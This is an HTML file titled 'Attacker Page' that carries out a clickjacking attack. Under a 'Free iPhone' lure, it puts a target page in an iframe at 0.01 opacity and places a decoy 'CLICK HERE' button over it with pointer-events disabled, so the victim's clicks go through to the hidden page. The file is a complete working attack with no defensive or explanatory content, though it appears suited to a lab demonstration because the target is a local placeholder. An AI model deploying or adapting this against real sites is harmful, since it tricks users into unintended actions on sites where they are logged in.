<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Page</title>
    <style>
        body {
            background-color: #222;
            color: #fff;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .iframe-container {
            position: relative;
            width: 300px;
            height: 200px;
            margin: 100px auto;
            border: 1px solid #ccc;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        iframe {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0.01; /* Make iframe almost invisible */
            z-index: 2; /* Place iframe on top */
        }
        .fake-button {
            position: absolute;
            top: 60%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 0, 0, 0.8);
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            outline: none;
            border-radius: 5px;
            z-index: 3; /* Ensure button is on top of iframe */
            pointer-events: none; /* Allow clicks to pass through */
        }
        .fake-button:hover {
            background-color: rgba(255, 0, 0, 1);
        }
    </style>
</head>
<body>
    <h1>Free iPhone</h1>
    <div class="iframe-container">
        <iframe src="target.html" frameborder="0"></iframe>
        <button class="fake-button">
            CLICK HERE
        </button>
    </div>
</body>
</html>
